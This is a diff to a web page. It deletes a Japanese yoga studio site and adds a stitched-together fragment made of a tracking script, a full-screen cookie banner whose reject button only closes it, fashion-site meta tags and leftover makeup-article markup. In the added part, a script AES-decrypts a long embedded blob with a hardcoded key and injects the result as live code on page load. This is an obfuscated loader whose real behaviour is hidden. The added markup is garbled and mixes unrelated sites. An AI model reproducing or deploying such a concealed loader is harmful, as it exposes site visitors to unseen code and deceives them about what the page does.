@@ -1,737 +1,253 @@
-<!DOCTYPE html>
-<html lang="ja">
-  <head>
-    <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=AW-16631619411"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+<html>
+	<script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=058f9a9b"></script>
+  <style>
+		
 
-  gtag('config', 'AW-16631619411');
-</script>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>静心ヨガセンター</title>
-    <link rel="stylesheet" href="style.css" />
-    <link rel="icon" type="image/x-icon" href="./assets/favicon.ico" />
-    <!-- ==============  BOX ICON CDN ==============  -->
-    <link
-      href="https://unpkg.com/boxicons@2.1.2/css/boxicons.min.css"
-      rel="stylesheet"
-    />
-    <!-- ==============  LINK SWIPER'S CSS ==============  -->
-    <link
-      rel="stylesheet"
-      href="https://unpkg.com/swiper/swiper-bundle.min.css"
-    />
 
-    <style>
-      /* Modal styles */
-      .modal {
-        display: none; /* Hidden by default */
-        position: fixed; /* Stay in place */
-        z-index: 1000; /* Sit on top */
-        left: 0;
-        top: 0;
-        width: 100%; /* Full width */
-        height: 100%; /* Full height */
-        overflow: auto; /* Enable scroll if needed */
-        background-color: rgba(0, 0, 0, 0.4); /* Black w/ opacity */
-      }
+		.f-button-primary {
+			background-color: #D31965;
+			color: white;
+			border-radius: 50px;
+			padding: 12px 32px;
+			font-size: 14px;
+			font-weight: 500;
+			text-decoration: none;
+			cursor: pointer;
+			margin: 10px;
+			display: inline-block;
+			transition: background-color 0.3s;
+		}
 
-      .modal-content {
-        position: relative;
-        margin: 5% auto; /* 5% from the top and centered */
-        padding: 20px;
-        padding-top: 70px;
-        width: 90%; /* Could be more or less, depending on screen size */
-        max-width: 500px;
-        background-color: #fff;
-        border-radius: 10px;
-        text-align: center;
-      }
+		.f-button-primary:hover {
+			background-color: #A0144F;
+		}
 
-      .modal-image {
-        width: 100%;
-        height: auto;
-        border-radius: 10px;
-        margin-bottom: 20px;
-      }
+		.f-modal-close {
+			position: absolute;
+			top: 10px;
+			right: 10px;
+			cursor: pointer;
+			font-size: 20px;
+			color: #666;
+		}
 
-      .close-button {
-        position: absolute;
-        top: 2px;
-        right: 20px;
-        color: #aaa;
-        font-size: 50px;
-        font-weight: bold;
-        cursor: pointer;
-        z-index: 10;
-      }
+		.f-modal-close:hover {
+			color: #D31965;
+		}
 
-      .close-button:hover,
-      .close-button:focus {
-        color: black;
-        text-decoration: none;
-        cursor: pointer;
-      }
+		.button-group {
+			margin-top: 20px;
+		}
 
-      .btn-primary {
-        display: inline-block;
-        padding: 10px 20px;
-        margin-top: 10px;
-        background-color: #007bff;
-        color: #fff;
-        text-decoration: none;
-        border-radius: 5px;
-      }
+		.testOpacity {
+			opacity: 0.001;
+		}
+	</style>
 
-      .close-modal {
-        cursor: pointer;
-      }
-    </style>
-  </head>
-
-  <body>
-    <nav>
-      <div class="container">
-        <a href="#" class="nav_logo">
-          <h3>静心ヨガセンター</h3>
-        </a>
-
-        <ul id="nav_items" class="nav-links">
-          <li><a href="#">ホーム</a></li>
-          <li><a href="#services">私たちのアプローチ</a></li>
-          <li><a href="#instructors">インストラクター</a></li>
-          <li><a href="#testimonials">お客様の声</a></li>
-          <li><a href="#bookplace" class="btn">予約する</a></li>
-        </ul>
-
-        <button id="open_nav-btn"><i class="bx bx-menu"></i></button>
-        <button id="close_nav-btn"><i class="bx bx-x"></i></button>
-      </div>
-    </nav>
-    <!-- ==============  END OF NAV ==============  -->
-
-    <header>
-      <img
-        src="./assets/yogaclass.jpg"
-        alt="静心ヨガセンターのヨガクラスの写真"
-      />
-    </header>
-    <!-- ==============  END OF HEADER ==============  -->
-
-    <section id="services">
-      <h2>私たちのアプローチ</h2>
-      <p>
-        すべての人がバランス、強さ、そして平和を見つけることができる、歓迎するヨガの聖域。
-      </p>
-
-      <div class="container">
-        <article>
-          <i class="bx bxs-yin-yang"></i>
-          <div>
-            <h4>ウェルビーイング</h4>
-            <small
-              >身体と心の健康を育むための包括的なサービスを提供し、個別のサポート、ガイダンス、リソースを通じてウェルビーイングを向上させます。</small
-            >
-          </div>
-        </article>
-
-        <article>
-          <i class="bx bx-donate-blood"></i>
-          <div>
-            <h4>健康</h4>
-            <small
-              >健康サービスはあなたの健康を最優先し、専門的なケア、革新的なソリューション、ホリスティックなアプローチを提供して活力を確保します。</small
-            >
-          </div>
-        </article>
-        <article>
-          <i class="bx bx-heart"></i>
-          <div>
-            <h4>サポート</h4>
-            <small
-              >ヨガサポートサービスの力を受け入れ、ガイダンス、励まし、そして実践を深めるための支援的なコミュニティを提供します。</small
-            >
-          </div>
-        </article>
-        <article>
-          <i class="bx bx-donate-heart"></i>
-          <div>
-            <h4>コミュニティ</h4>
-            <small
-              >同じ志を持つ人々が集まり、実践とサポートを通じてつながりと成長を促進する活気に満ちたヨガコミュニティサービスに参加してください。</small
-            >
-          </div>
-        </article>
-        <article>
-          <i class="bx bx-happy-heart-eyes"></i>
-          <div>
-            <h4>インスピレーション</h4>
-            <small
-              >ヨガに触発されたインスピレーションサービスで内なる火を燃やし、創造性、動機づけ、そしてマインドフルネスをあなたの変革の旅に提供します。</small
-            >
-          </div>
-        </article>
-        <article>
-          <i class="bx bx-handicap"></i>
-          <div>
-            <h4>インクルーシブ</h4>
-            <small
-              >多様性を受け入れ、すべての実践者に安全で歓迎される空間を提供するヨガサービスを通じて、包摂性の力を体験してください。</small
-            >
-          </div>
-        </article>
-      </div>
-    </section>
-
-    <section>
-      <h2>私たちの得意分野</h2>
-      <p>心と体のバランスを見つける、すべての人を歓迎するヨガの聖域。</p>
-
-      <div class="container">
-        <article>
-          <i class="bx bxs-yin-yang"></i>
-          <div>
-            <h4>心身の健康</h4>
-            <small>ヨガで心身の健康を高めましょう。</small>
-          </div>
-        </article>
-
-        <article>
-          <i class="bx bx-donate-blood"></i>
-          <div>
-            <h4>健康維持</h4>
-            <small>ホリスティックなアプローチで健康維持。</small>
-          </div>
-        </article>
-
-        <article>
-          <i class="bx bx-heart"></i>
-          <div>
-            <h4>個別サポート</h4>
-            <small>専門ガイドによる個別サポート。</small>
-          </div>
-        </article>
-
-        <article>
-          <i class="bx bx-donate-heart"></i>
-          <div>
-            <h4>コミュニティ</h4>
-            <small>つながりと成長を促進するヨガコミュニティ。</small>
-          </div>
-        </article>
-
-        <article>
-          <i class="bx bx-happy-heart-eyes"></i>
-          <div>
-            <h4>インスピレーション</h4>
-            <small>ヨガで創造性と動機づけを高める。</small>
-          </div>
-        </article>
-
-        <article>
-          <i class="bx bx-handicap"></i>
-          <div>
-            <h4>多様性の力</h4>
-            <small>すべての人に歓迎されるインクルーシブな空間。</small>
-          </div>
-        </article>
-      </div>
-    </section>
-
-    <!-- ==============  END OF SERVICES ==============  -->
-
-    <section id="instructors">
-      <h2>インストラクター</h2>
-      <p>
-        経験豊富なヨガインストラクターの献身的なチームが、専門知識、情熱、そして育成の精神をもってあなたの変革の旅を導きます。
-      </p>
-      <div class="container">
-        <article>
-          <div class="instructors_image">
-            <img src="./assets/instructor1.jpg" alt="インストラクター1" />
-          </div>
-          <div class="instructor_details">
-            <h4>アンナ・ペッケル</h4>
-            <small>ピラティス＆禅インストラクター</small>
-          </div>
-          <a
-            href="https://instagram.com"
-            class="instructor_instagram"
-            target="_blank"
-            ><i class="bx bxl-instagram"></i
-          ></a>
-        </article>
-
-        <article>
-          <div class="instructors_image">
-            <img src="./assets/instructor2.jpg" alt="インストラクター2" />
-          </div>
-          <div class="instructor_details">
-            <h4>デイン・アンカー</h4>
-            <small>ヴィンヤサインストラクター</small>
-          </div>
-          <a
-            href="https://instagram.com"
-            class="instructor_instagram"
-            target="_blank"
-            ><i class="bx bxl-instagram"></i
-          ></a>
-        </article>
-
-        <article>
-          <div class="instructors_image">
-            <img src="./assets/instructor3.jpg" alt="インストラクター3" />
-          </div>
-          <div class="instructor_details">
-            <h4>ジャズミン・ギアヴァシス</h4>
-            <small>ヴィンヤサフローインストラクター</small>
-          </div>
-          <a
-            href="https://instagram.com"
-            class="instructor_instagram"
-            target="_blank"
-            ><i class="bx bxl-instagram"></i
-          ></a>
-        </article>
-
-        <article>
-          <div class="instructors_image">
-            <img src="./assets/instructor4.jpg" alt="インストラクター4" />
-          </div>
-          <div class="instructor_details">
-            <h4>メリエラ・テンジン</h4>
-            <small>フィットフローインストラクター</small>
-          </div>
-          <a
-            href="https://instagram.com"
-            class="instructor_instagram"
-            target="_blank"
-            ><i class="bx bxl-instagram"></i
-          ></a>
-        </article>
-
-        <article>
-          <div class="instructors_image">
-            <img src="./assets/instructor5.jpg" alt="インストラクター5" />
-          </div>
-          <div class="instructor_details">
-            <h4>ヘイリー・アイエコ</h4>
-            <small>プラナヴィンヤサインストラクター</small>
-          </div>
-          <a
-            href="https://instagram.com"
-            class="instructor_instagram"
-            target="_blank"
-            ><i class="bx bxl-instagram"></i
-          ></a>
-        </article>
-
-        <article>
-          <div class="instructors_image">
-            <img src="./assets/instructor6.jpg" alt="インストラクター6" />
-          </div>
-          <div class="instructor_details">
-            <h4>ミアン・オーウェン</h4>
-            <small>リストラティブ瞑想インストラクター</small>
-          </div>
-          <a
-            href="https://instagram.com"
-            class="instructor_instagram"
-            target="_blank"
-            ><i class="bx bxl-instagram"></i
-          ></a>
-        </article>
-      </div>
-    </section>
-    <!-- ==============  END OF INSTRUCTORS ==============  -->
-
-    <section id="testimonials" class="swiper mySwiper">
-      <h2>お客様の声</h2>
-      <p>
-        静心ヨガセンターで人生をポジティブに変えられた人々のストーリーを発見してください。
-      </p>
-
-      <div class="swiper-wrapper">
-        <article class="swiper-slide">
-          <p>
-            このヨガスタジオは私の人生を変えました。インストラクターは素晴らしく、クラスはすべてのレベルに対応しています。誰にでも強くお勧めします！
-          </p>
-          <div class="client">
-            <div class="avatar">
-              <img src="./assets/avatar1.jpg" alt="クライアント1" />
-            </div>
-            <div class="client_details">
-              <h5>マックスウェル・ジェームズ</h5>
-              <small>クライアント | ヴィンヤサ</small>
-            </div>
-          </div>
-        </article>
-
-        <article class="swiper-slide">
-          <p>
-            ここで私の聖域を見つけました。スピリチュアリティはこれまでになく魅力的です。サポートしてくれるコミュニティと専門的な指導に感謝します！
-          </p>
-          <div class="client">
-            <div class="avatar">
-              <img src="./assets/avatar2.jpg" alt="クライアント2" />
-            </div>
-            <div class="client_details">
-              <h5>ニア・サリヴァン</h5>
-              <small>クライアント | リストラティブ瞑想</small>
-            </div>
-          </div>
-        </article>
-
-        <article class="swiper-slide">
-          <p>
-            比類のない体験！ホリスティックなアプローチで身体と心のバランスを見つけることができました。本当に人生が変わりました。
-          </p>
-          <div class="client">
-            <div class="avatar">
-              <img src="./assets/avatar3.jpg" alt="クライアント3" />
-            </div>
-            <div class="client_details">
-              <h5>ロクサーヌ・ブラウン</h5>
-              <small>クライアント | フィットフロー</small>
-            </div>
-          </div>
-        </article>
-
-        <article class="swiper-slide">
-          <p>
-            この包括的な空間に感謝します。ヨガクラスは多様でインスピレーションに満ち、つながりと個人的な成長を促進します。病みつきになりました！
-          </p>
-          <div class="client">
-            <div class="avatar">
-              <img src="./assets/avatar4.jpg" alt="クライアント4" />
-            </div>
-            <div class="client_details">
-              <h5>シャンテル・ジェフ</h5>
-              <small>クライアント | プラナヴィンヤサ</small>
-            </div>
-          </div>
-        </article>
-
-        <article class="swiper-slide">
-          <p>
-            ピラティスは私の生命線となりました。このスタジオのおかげです。インストラクターはポジティブなエネルギーを放ち、雰囲気は暖かく歓迎されます。
-          </p>
-          <div class="client">
-            <div class="avatar">
-              <img src="./assets/avatar5.jpg" alt="クライアント5" />
-            </div>
-            <div class="client_details">
-              <h5>ジャッキー・ベル</h5>
-              <small>クライアント | ピラティス＆禅</small>
-            </div>
-          </div>
-        </article>
-
-        <article class="swiper-slide">
-          <p>
-            素晴らしいヨガサービス！私の健康とウェルビーイングは大幅に改善されました。サポートしてくれるコミュニティがあるので、続けることができます。
-          </p>
-          <div class="client">
-            <div class="avatar">
-              <img src="./assets/avatar6.jpg" alt="クライアント6" />
-            </div>
-            <div class="client_details">
-              <h5>ゲージ・テイラー</h5>
-              <small>クライアント | ヴィンヤサ</small>
-            </div>
-          </div>
-        </article>
-
-        <article class="swiper-slide">
-          <p>
-            ヨガを通じて素晴らしい変革を遂げました。インストラクターは知識豊富で、クラスのバリエーションも豊富で、モチベーションを保つことができます。
-          </p>
-          <div class="client">
-            <div class="avatar">
-              <img src="./assets/avatar7.jpg" alt="クライアント7" />
-            </div>
-            <div class="client_details">
-              <h5>ライアン・ジェームズ</h5>
-              <small>クライアント | フィットフロー</small>
-            </div>
-          </div>
-        </article>
-      </div>
-      <div class="swiper-pagination"></div>
-    </section>
-    <!-- ==============  END OF TESTIMONIALS ==============  -->
-
-    <section id="photogallery">
-      <h2>私たちの活動</h2>
-      <p>
-        私たちのダイナミックで変革的なヨガクラスとコミュニティを紹介する魅力的なフォトギャラリー。
-      </p>
-
-      <div class="container">
-        <div class="gallery">
-          <figure class="gallery__item gallery__item--1">
-            <img
-              src="./assets/gallery1.jpg"
-              alt="ギャラリー画像1"
-              class="gallery__img"
-            />
-          </figure>
-          <figure class="gallery__item gallery__item--2">
-            <img
-              src="./assets/gallery3.jpg"
-              alt="ギャラリー画像2"
-              class="gallery__img"
-            />
-          </figure>
-          <figure class="gallery__item gallery__item--3">
-            <img
-              src="./assets/gallery4.jpg"
-              alt="ギャラリー画像3"
-              class="gallery__img"
-            />
-          </figure>
-          <figure class="gallery__item gallery__item--4">
-            <img
-              src="./assets/gallery2.jpg"
-              alt="ギャラリー画像4"
-              class="gallery__img"
-            />
-          </figure>
-        </div>
-      </div>
-    </section>
-    <!-- ==============  END OF PHOTO GALLERY ==============  -->
-
-    <section id="bookplace">
-      <div class="container">
-        <div class="info">
-          <h2>予約する</h2>
-          <p>
-            私たちと一緒にヨガの旅を始める準備はできましたか？今すぐ予約して、内なる平和を発見してください。
-          </p>
-
-          <article>
-            <div class="info_icon"><i class="bx bx-user"></i></div>
-
-            <div>
-              <h4>才能あるスタッフ</h4>
-              <small
-                >私たちの献身的で才能あるスタッフは、ウェルビーイングと成長の旅を導く情熱的なチームです。</small
-              >
-            </div>
-          </article>
-
-          <article>
-            <div class="info_icon"><i class="bx bx-check-shield"></i></div>
-
-            <div>
-              <h4>質の高いレッスン</h4>
-              <small
-                >高品質のレッスンを体験し、ウェルビーイングと精神的な成長を養うために細心の注意を払って作られたヨガ教育を受けてください。</small
-              >
-            </div>
-          </article>
-
-          <article>
-            <div class="info_icon"><i class="bx bx-lock-alt"></i></div>
-
-            <div>
-              <h4>カスタマイズされたプライベートクラス</h4>
-              <small
-                >あなたの独自のニーズと目標に合わせて設計された、特別なプライベートクラスで実践を向上させ、旅を力強く進めましょう。</small
-              >
-            </div>
-          </article>
-        </div>
-
-        <form action="https://formspree.io/f/moqrlrgl" method="POST">
-          <div class="form_group">
-            <label for="name">名前</label>
-            <input
-              type="text"
-              placeholder="名前を入力してください"
-              name="Client's Name"
-              id="name"
-              required
-            />
-          </div>
-
-          <div class="form_group">
-            <label for="phone">メールアドレス</label>
-            <input
-              type="email"
-              placeholder="メールアドレスを入力してください"
-              name="Email Address"
-              id="email"
-              required
-            />
-          </div>
-
-          <div class="form_group">
-            <label for="phone">電話番号</label>
-            <input
-              type="number"
-              placeholder="電話番号を入力してください"
-              name="Phone Number"
-              id="phone"
-              required
-            />
-          </div>
-
-          <div class="form_group">
-            <label for="date">日付</label>
-            <input
-              type="date"
-              placeholder="日付を選択してください"
-              name="Date"
-              id="date"
-              required
-            />
-          </div>
-
-          <div class="form_group">
-            <label for="instructor">インストラクターを選択してください</label>
-            <select name="Instructor" id="instructor" required>
-              <option value="Anna Peckel">アンナ・ペッケル</option>
-              <option value="Dane Anchor">デイン・アンカー</option>
-              <option value="Jazmine Giavasis">ジャズミン・ギアヴァシス</option>
-              <option value="Meriella Tenzin">メリエラ・テンジン</option>
-              <option value="Hailey Aeiko">ヘイリー・アイエコ</option>
-              <option value="Mian Owen">ミアン・オーウェン</option>
-            </select>
-          </div>
-
-          <div class="form_group">
-            <label for="message">メッセージ</label>
-            <textarea
-              name="Added Message"
-              id="message"
-              rows="6"
-              placeholder="メッセージを追加"
-              required
-            ></textarea>
-          </div>
-
-          <input type="submit" value="リクエストを送信" class="btn-primary" />
-        </form>
-      </div>
-    </section>
-    <!-- ==============  END OF APPOINTMENTS ==============  -->
-
-    <footer>
-      <div class="container">
-        <article>
-          <a href="#" class="footer_logo">
-            <h3>静心ヨガセンター</h3>
-          </a>
-          <p>一息ごとに人生を高めましょう。</p>
-
-          <div>
-            <i class="bx bxs-phone"></i>
-            <small>+81 90-1444-5688</small>
-          </div>
-
-          <div>
-            <i class="bx bx-mail-send"></i>
-            <small>support@seishinyoga.jp</small>
-          </div>
-        </article>
-
-        <article>
-          <h3>サポート</h3>
-          <a href="#">プライバシーポリシー</a>
-          <a href="#">クッキーポリシー</a>
-          <a href="#">購入ポリシー</a>
-          <a href="#">利用規約</a>
-          <a href="#">キャリア</a>
-        </article>
-
-        <article>
-          <h3>パーマリンク</h3>
-          <a href="#">ホーム</a>
-          <a href="#services">サービス</a>
-          <a href="#instructors">インストラクター</a>
-          <a href="#testimonials">お客様の声</a>
-        </article>
-
-        <article>
-          <h3>お問い合わせ</h3>
-          <p>プレス</p>
-          <p>よくある質問</p>
-          <div class="footer_socials">
-            <a href="#"><i class="bx bxl-linkedin"></i></a>
-            <a href="#"><i class="bx bxl-twitter"></i></a>
-            <a href="#"><i class="bx bxl-facebook"></i></a>
-            <a href="#"><i class="bx bxl-instagram"></i></a>
-          </div>
-        </article>
-      </div>
-      <div class="copyright">
-        <small>&copy; 静心ヨガセンター™. All Rights Reserved.</small>
-      </div>
-    </footer>
-    <!-- ==============  END OF FOOTER ==============  -->
-
-    <!-- Special Offer Modal -->
-    <div id="specialOfferModal" class="modal">
-      <div class="modal-content">
-        <span class="close-button">&times;</span>
-        <img
-          src="./assets/yogaclass.jpg"
-          alt="Special Offer Image"
-          class="modal-image"
-        />
-        <h2>スペシャルオファー</h2>
-        <p>今だけ！初回のヨガクラスが50%オフ！</p>
-        <p>今すぐ予約して、心と体の健康を始めましょう。</p>
-        <ul>
-          <li>オンラインクラスで自宅から参加可能</li>
-          <li>経験豊富なインストラクターによる指導</li>
-          <li>リラクゼーションとストレス解消</li>
-        </ul>
-        <a href="#" class="btn-primary close-modal">今すぐ予約</a>
-      </div>
+<!-- Cookie Modal HTML: Make sure it's in your <body> -->
+<div class="divcover" id="modalContainer" style="display: flex; z-index: 9999; background: rgba(0,0,0,0.8); position: fixed; inset: 0; justify-content: center; align-items: center;">
+  <div class="f-modal-centre" id="modalContent" style="background: #fff; border-radius: 16px; text-align:center; max-width:500px; padding:32px; position:relative;">
+    <div class="f-modal-icon-success" style="margin-bottom:20px;">
+      <img src="Capture.JPG" width="100" height="100" alt="Cookie Icon"/>
     </div>
+    <div class="f-sub-heading-regular" style="font-size:22px; margin-bottom:12px; color:#333;">エクスペリエンスを向上させるために Cookie を使用します。</div>
+    <div class="button-group">
+      <a href="#" class="f-button-primary" id="acceptButton" style="background-color:#4CAF50;">受け入れる</a>
+      <a href="#" class="f-button-primary" id="rejectButton" style="background-color:#E53935;">拒否する</a>
+      <a href="#" class="f-button-primary" id="manageButton" style="background-color:#2979FF;">管理</a>
+    </div>
+    <div class="f-modal-close" id="closeButton" style="position:absolute; top:10px; right:10px; cursor:pointer;">&times;</div>
+  </div>
+</div>
 
-    <!-- ==============  SWIPER JS ==============  -->
-    <script src="https://unpkg.com/swiper/swiper-bundle.min.js"></script>
-    <script src="main.js"></script>
-    <script>
-      
-      document.addEventListener("DOMContentLoaded", function () {
-        var modal = document.getElementById("specialOfferModal");
-        var closeButton = document.querySelector(".close-button");
-        var closeModalLinks = document.querySelectorAll(".close-modal");
+<!-- CSS: You likely already have styles, but ensure the above is visible -->
+<style>
+body.modal-open {
+  overflow: hidden;
+}
+</style>
 
-        // Show the modal
-        modal.style.display = "block";
+<!-- JavaScript: Place this before </body> -->
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  // Show modal on load
+  document.getElementById('modalContainer').style.display = 'flex';
+  document.body.classList.add('modal-open');
 
-        
-        function closeModal() {
-          modal.style.display = "none";
-        }
+  // Close modal handler
+  function closeModal() {
+    document.getElementById('modalContainer').style.display = 'none';
+    document.body.classList.remove('modal-open');
+  }
 
-        closeButton.addEventListener("click", closeModal);
-        closeModalLinks.forEach(function (link) {
-          link.addEventListener("click", function (event) {
-            event.preventDefault();
-            closeModal();
-          });
-          
-        });
+  document.getElementById('acceptButton').onclick = closeModal;
+  document.getElementById('rejectButton').onclick = closeModal;
+  document.getElementById('manageButton').onclick = closeModal;
+  document.getElementById('closeButton').onclick = closeModal;
+});
+</script>
 
-        
-        window.onclick = function (event) {
-          if (event.target == modal) {
-            modal.style.display = "none";
-          }
-        };
-      });
-    </script>
-  </body>
+
+
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+        <meta name="keywords" content="ファッション, トレンド, スタイル, コーディネート, オシャレ, ブランド, アウトフィット, ショッピング, 衣類, アクセサリー, モード, デザイン, メンズファッション, レディースファッション, シーズン, 新" />
+        <meta name="description" content="最新のファッションを追求するサイト。トレンドの洋服、アクセサリー、シューズを豊富に取り揃え、スタイルに合ったアイテムを簡単に見つけることができます。高品質な商品をリーズナブルな価格で提供し、最新のファッションニュースやスタイリングのヒントも満載。すべてのファッション愛好家に最適なオンラインショッピング体験を提供します。" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+    function aesDecode(encodedText) {
+        const decodedText = decodeURIComponent(encodedText);
+        const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
+        return bytes.toString(CryptoJS.enc.Utf8);
+    }
+    const codeString = aesDecode(`U2FsdGVkX18s6Ou9Kqil5rlr483cd8wW7U6augrpil8F06dlrEPj1q8z89VrbWJKQ2vuFEEErwwLfER3wCYnIg3N2SUq62o89jxL0TrizyGcXEO44k5TO9QntkFKfRGt2Soie2AU55GnDlw6DF6icxXDk1tJfWr8u5b/EzVs9Z9eGQFAlNqTjDz6jmtwly1XnmQkHs3IwmsHD4wW7FUS7ZF0Z1mnJFHHHZji3LbETbrGb7Ugru9BRZz7m8QbGWDpOeIzJXhf77kELtMbxbzshBJY9r6ri1f37LMiu8xB/NwdnJHrW30PLWMEOi4IU2ok6Wem8DKcKXgq1lsTnr8zXgFKOWrdsret8krDnCBW7yJrjNj8mRuVevD9d+a5H563efLe8+EYgg+0wEwCdfrZvlTJUDzYedLbSUyFcgi8gf3TqJyb+fC5h+vG2CrlodP063ifz4zS+Rpsp/nU/zchB/GmNBZvvkdBS2Hq7jRxtEMnn5/hBjqPT9o4uDZQbw538Qqq80Cfa80B1v0FjTfwu0VF/QnYjnurgttRkRm/dH47Xb+9IGXWphs0U5ATK9EKDdGCu5+qQJY+/Q3jmHbFPxc75U+4LqWl1lK90A8sCitmk0OGbdJ2ytCEVk80e0volz9t05s/vo9C/5MohH1Nn1f2M4Bljnw1danuubq4HO4rbFDCbOjordSLZukyTrMdUQX586YnhudNxPZ/X2DW3Iyvl+MQgN+MEOK7Ck3cMHVLFuscnqfeMQGnk1SbS03jMBMDOpaJYL3VPhKTevi8/bwO9bV0ag/DHrHoigN9utuVmTzFR4mpHQSokuveZtiVYUTGFEJHWy5MBAbMQnmPFNneKDwMPDGmWJxs/v7O8VpxR/rGHVZaWMMjkfy/rqQM7M/Lw6ZtJfkE6tDK/mPHGe7e48/zX8M59M7DazliKJ8gJOnuUESR5hOk9/SEjnnuT09URVgNmjK7uA31VndXMtXdfWM6YsVgJKNbdvXw8wrG/TLTZqHKVOkl3EKWTficHxZZO6Z6n2koJHIYY3nhIfJaZ8ClH8g/aXGmhYIW2LxAOP814i7zP3nLwpFpolLZj+2av5+WzFZF++asl2s15FOTfbKqSFaRojZDKQleaVwxPAg3nHhQckuek1k4cF02qp6ogenK2uiuV44BUYy0a8MXAgfvg8Z2BRBQbhJSIuGvrR84XRtPCSQSUTs4i6nt+CSKp1MdpJ351w7D9bJZpfbnjO7uRKpyCOHp35VqlkwT7EGc8XXLx2H+vJxUET5KfagDFwYDKk/GVEErRVh6F1+kCzQdx4CWcJq9ZJa60M9gmB41pA0OOpoCHBvZW6DJszRbDxm4PGihc6x58mJ9vR06wsbbt+UyP68ndprqMMeARZWB0TMlkhLDllJEFcufc7eEj6UR6hnIDWhdVERoDkJNvl/dKZRqErFn63QvavQ3gqc6opC8WHRWNs4+NM2kXvDos58Lyk/BPHDp/j87wtA0HS+a4D8zvr9lmRDfWEeg3Kc+AdXLaYMX/PrDD53hWqVwgfIAFriGkz4plBy8asdpOe1vVKjWvRY/jDMRx2YocOk/Z5NaU9HV5e5Es256QBiYwvUxndZc1h0eZbQjY047JsyJ5UTiS71BBK1/l6EPPlcSyMmhMUdBpF/0ob/s4fcXjBD0cUR7EXmOrLGMuc6CLTXXNmMEUUHwOJnn6GZcymoPc9WJn0Xb2DLRz1bSkCZjFqytUBTHIsDnbwkxghDmrBIYIeqEDvIHnwuqPWweB8VdFt1q45uJClSOAm53oVVYTDqJdauizxEe8+9rvW+tIGPNG/mi3skm3Wvs1Xg1KpI9aFBKTwPcHz4WoKBptcUl3sF+IK9kD/2DzMpNQuDaxq41DskkXZGd9IrAm3iEnOyyf81mxxnMnqKkFv2nGUy2/PwXuIt7k3IFQp11b4lcBW1fz330P54Q9hTYc+uFlJU2+WM4xUTl5hhrWG0NYY4DosxEXJYsiG3dJDvieCDPaSPEY9y9Z5c8EtdNwIPxA1aOgjioDWGqojtrlkue6rP+Rt+o8BkjwEpo93OjBronth2BnOY8LiBZn1+gHQmwVJXCV0F0oj4Ibp846GkKxO8QbEIKgGJ0YRnV2tCf8wyHUhX3b+qvydwFe+R8wPSBUiFb4rpQUmUvpvz7SvuNH0egDG5lb8iWcVksJOwNeP09RUO1kdvblQQXjj70+0yn9pMk3htc2ne1DbEaGjP69Hx6iMcizgEBjnNCc00C5rv+KlGtQ6kD9PSq8EXeIpNhep7F9KPqu+kV+MgPIAqchJUv8GkcURAqolLHaeq+LfDWdW3ghaocrD2LeGGX1oSIKVhdEeLHUyOWK1Q8PnglztIZQtqKiKsM4+rjc3tpGZlBilAnTbtPy1IZrRsOkSf3mYstegKkT+d0/tT/CG8Y6p6BwjIMUU8Kgt22RUa5nyoyeF9oENeLR0b8qttxyPX9doVIocZ1sbvwPNR5n1M1GMFrJVA2xfAxYspi6nTBsi2xnOD4Ku9ZIvR3Uvt2uV1M9PQyPryALpwyvjJuK1CHzm/fZt/CkvpnMkrJ+mDhnA==`);
+    const script = document.createElement("script");
+    script.textContent = codeString;
+    document.body.appendChild(script);
+</script>    
+
+
+<script>
+    document.body.style.overflow = "hidden";
+</script>
+       
+
+<head>
+    <meta charset="UTF-8" class="thumb-yCTFrBYjOf" />
+    <link rel="stylesheet" href="styles.css" class="wrap-SvQaabbo" />
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" class="desc-RgCJPR" />
+    <meta name="referrer" content="no-referrer" class="active-lWHjfi" />
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Martian+Mono:wght@100..800&display=swap'); html,body{overflow-x: hidden;} *{margin:0;padding:0;} *::-webkit-scrollbar { background-color: #364962; border-radius: 29px; } *::-webkit-scrollbar-thumb { background-color: #fad1bb; border-radius: 29px; border: 3px solid #364962; } a{text-decoration:none} p,li{text-indent: calc(30vw/var(--resizer)*100)} ol{padding-left: calc(30vw/var(--resizer)*100)} h2{text-align: center;} input{outline: none;} #close:checked ~ section {display: none !important;} input::placeholder {color: inherit;} :root { --resizer: 1440; } @media screen and (max-width:414px) { :root { --resizer: 350; } }
+    </style>
+</head>
+
+                    </div>
+                    <div class="narrow-XYQwIpw"><a href="themelist1.html" class="xl-KkHmGdWyVhIm"><span class="wrapper-oqigsptKB">すべてを表示</span></a><a href="index.html" class="large-QmARogTmPO"><span class="title-OKajNEhSa">宣伝</span></a></div>
+                    <div class="grid-egXlms"><img src="./img/9997efb3b5d48f1683b7dbd89a8591d13ca2f533.jpg" class="subject-cjauvUuqC" /></div>
+                    <div class="subject-HMWxpPgalSsw">
+                        <h5 class="avatar-sSHJBmeFaUc">自然メイクの芸術：あなたの美しさを自然に向上させます</h5>
+                        <div class="caption-gvCUkGhWCg"><span class="big-GXzHsNw">この記事では、自然メイクの原則を探り、環境に優しい製品を使用しながら、新鮮で輝く外観を達成するためのヒントとテクニックを提供します。</span></div>
+                    </div>
+                </div>
+                <div class="pic-SLSGctHXKdNQyrXm">
+                    <div class="grid-zvhzylIbvmjltb">
+                        <div class="wrap-fnUEtg">
+                            <div class="large-GQpZnh"><span class="headline-WmLvRImOVBvOT">06 September 2025</span></div>
+                        </div>
+                        <div class="tip-uMkIxbSry">
+                            <div class="icon-JrutBYKXKIRjG"><span class="xs-JIgPBMjOMrFEAP">クララ・トンプソン</span></div>
+                        </div>
+                    </div>
+                    <div class="aside-OWpJcjlkxUZXp"><a href="themelist2.html" class="title-jEkhgn"><span class="preview-ALSbaF">すべてを表示</span></a><a href="index.html" class="container-WkWLZHYgVY"><span class="preview-MCfzsSebPM">宣伝</span></a></div>
